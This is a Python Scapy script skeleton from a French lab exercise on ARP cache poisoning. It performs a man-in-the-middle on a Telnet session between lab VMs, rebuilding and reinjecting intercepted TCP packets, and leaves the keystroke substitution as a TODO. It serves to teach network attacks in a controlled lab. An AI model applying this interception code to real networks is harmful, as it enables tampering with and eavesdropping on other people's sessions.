#!/usr/bin/env python3
# ------------------------------------------------------------------
# TP ARP Cache Poisoning - Tache 2 : MITM sur Telnet
# ------------------------------------------------------------------
# Pre-requis : A et B doivent deja etre empoisonnes (cache ARP de A
# et de B pointant vers M), et l'IP forwarding doit etre actif sur M
# le temps d'etablir la session Telnet, PUIS desactive (voir sujet).
#
# Ce script :
#  - capture les paquets TCP,
#  - pour les paquets de A vers B avec une charge utile : remplace
#    CHAQUE caractere tape par un caractere fixe (a vous de choisir
#    cette valeur, ou de la lire dans votre brief de mission),
#  - pour les paquets de B vers A : les retransmet tels quels.
#
# A COMPLETER : la partie construction de newdata, et le filtre BPF
# (pour ne pas capturer les paquets emis par ce script lui-meme).
# ------------------------------------------------------------------

from scapy.all import *

VM_A_IP = "10.0.2.6"
VM_B_IP = "10.0.2.7"
MY_IP   = "10.0.2.5"

def spoof_pkt(pkt):
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
        newpkt = IP(pkt[IP])
        del newpkt.chksum
        del newpkt[TCP].chksum
        del newpkt[TCP].payload

        olddata = pkt[TCP].payload.load
        newdata = olddata   # TODO : remplacer chaque caractere tape

        send(newpkt / newdata, verbose=0)

    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
        send(pkt[IP], verbose=0)

# TODO : adaptez le filtre BPF pour exclure le trafic genere par M lui-meme
sniff(filter="tcp and not host %s" % MY_IP, prn=spoof_pkt)
